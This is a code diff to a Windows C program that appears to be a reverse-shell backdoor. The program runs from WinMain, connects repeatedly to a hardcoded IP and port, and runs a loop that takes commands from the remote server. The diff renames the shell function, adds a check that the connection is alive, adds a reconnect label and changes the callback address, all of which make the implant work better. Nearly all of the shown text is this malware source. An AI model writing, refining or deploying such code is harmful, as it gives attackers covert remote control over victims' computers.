@@ -3,8 +3,8 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <winuser.h>
 #include <wininet.h>
 #include <windowsx.h>
@@ -31,15 +31,28 @@
 
 //====== Global Variables =======//
 int sock;
+struct sockaddr_in ServAddr;
+
+boolean connected(SOCKET sock){
+     char buf;
+     int err = recv(sock, &buf, 1, MSG_PEEK);
+     if(err == SOCKET_ERROR) {
+        if (WSAGetLastError() != WSAEWOULDBLOCK) {
+            closesocket(sock);
+            return FALSE;
+        }
+     }
+     return TRUE;
+}
 
 //============ Shell ============//
-void Shell() {
+void Cmd() {
     char buffer[1024];
     char container[1024];
     char total_response[18384];
 
-    while (TRUE) {
-		bzeroWin(buffer,1024);
+    while (connected(sock)) {
+		bzeroWin(buffer, 1024);
 		bzeroWin(container, sizeof(container));
 		bzeroWin(total_response, sizeof(total_response));
         // receive variables
@@ -79,12 +92,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
     
     // setup socket for connection
-    struct sockaddr_in ServAddr;
     unsigned short ServPort;
     char *ServIP;
     WSADATA wsaData;
 
-    ServIP = "192.168.43.80";
+    ServIP = "192.168.43.31";
     ServPort = 50005;
 
     /**
@@ -109,10 +121,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
 	ServAddr.sin_port = htons(ServPort);
     
+    reconnect:
     // attempt to connect to server in evry 30 seconds until it is successful 
 	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
 		Sleep(30);
 	}
 
-    Shell();
+    Cmd();
 }
